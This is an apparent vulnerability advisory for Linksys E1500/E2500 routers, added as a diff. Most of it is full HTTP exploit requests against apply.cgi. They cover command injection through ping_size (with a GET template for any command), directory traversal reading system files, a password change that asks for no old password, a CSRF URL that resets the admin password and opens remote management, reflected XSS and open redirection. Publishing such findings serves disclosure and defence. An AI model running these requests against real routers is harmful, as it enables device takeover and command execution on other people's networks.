@@ -1,0 +1,124 @@
+============ Vulnerability Overview: ============
+
+    * OS Command Injection / E1500 and E2500 v1.0.03 
+
+=> Parameter: ping_size=%26ping%20192%2e168%2e178%2e102%26
+
+
+Example Exploit:
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/Diagnostics.asp
+Authorization: Basic xxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 185
+Connection: close
+
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=%26ping%20192%2e168%2e178%2e102%26&ping_times=5&traceroute_ip=
+
+Change the request methode from HTTP Post to HTTP GET makes the exploitation easier:
+
+http://www.example.com/apply.cgi?submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=%26COMMAND%26&ping_times=5&traceroute_ip=
+
+
+    * Directory traversal - tested on E1500: 
+
+=> parameter: next_page
+
+
+Request:
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/Wireless_Basic.asp
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+
+submit_type=wsc_method2&change_action=gozila_cgi&next_page=../../proc/version
+
+Response:
+HTTP/1.1 200 Ok
+Server: httpd
+Date: Thu, 01 Jan 1970 00:00:29 GMT
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: 0
+Content-Type: text/html
+Connection: close
+
+Linux version 2.6.22 (cjc@t.sw3) (gcc version 4.2.3) #10 Thu Aug 23 11:16:42 HKT 2012
+
+
+    * For changing the current password there is no request of the current password - tested on E1500 
+
+Example Request:
+POST /apply.cgi HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.1.1/Management.asp
+Authorization: Basic xxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 311
+
+submit_button=Management&change_action=&action=Apply&PasswdModify=1&http_enable=1&https_enable=0&ctm404_enable=&remote_mgt_https=0&wait_time=4&need_reboot=0&http_passwd=admin&http_passwdConfirm=admin&_http_enable=1&web_wl_filter=0&remote_management=0&nf_alg_sip=0&upnp_enable=1&upnp_config=1&upnp_internet_dis=0
+
+    * CSRF
+	
+http://www.example.com/apply.cgi?submit_button=Management&change_action=&action=Apply&PasswdModify=1&http_enable=1&https_enable=0&ctm404_enable=&remote_mgt_https=0&wait_time=4&need_reboot=0&http_passwd=password1&http_passwdConfirm=password1&_http_enable=1&web_wl_filter=0&remote_management=1&_remote_mgt_https=1&remote_upgrade=0&remote_ip_any=1&http_wanport=8080&nf_alg_sip=0&upnp_enable=1&upnp_config=1&upnp_internet_dis=0
+
+    * Reflected Cross Site Scripting - tested on E1500 
+
+=> Parameter: wait_time=3'%3balert('pwnd')//
+
+
+Example Exploit:
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/Wireless_Basic.asp
+Authorization: Basic xxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 300
+
+submit_button=Wireless_Basic&action=Apply&submit_type=&change_action=&next_page=&commit=1&wl0_nctrlsb=none&channel_24g=0&nbw_24g=20&wait_time=3'%3balert('pwnd')//&guest_ssid=Cisco-guest&wsc_security_mode=&wsc_smode=1&net_mode_24g=mixed&ssid_24g=Cisco&_wl0_nbw=20&_wl0_channel=0&closed_24g=0
+
+
+    * Redirection - tested on E1500 
+
+=> Paramter: submit_button=http://www.example.compwnd.pwnd%0a
+
+Injecting URLs into the parameter submit_button reveals that this parameter is not properly validated for malicious input.
+
+Example Exploit:
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/Wireless_Basic.asp
+Authorization: Basic xxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 290
+
+submit_button=http://www.example.compwnd.pwnd%0a&action=Apply&submit_type=&change_action=&next_page=&commit=1&wl0_nctrlsb=none&channel_24g=0&nbw_24g=20&wait_time=3&guest_ssid=Cisco01589-guest&wsc_security_mode=&wsc_smode=1&net_mode_24g=mixed&ssid_24g=Cisco01589&_wl0_nbw=20&_wl0_channel=0&closed_24g=0
+
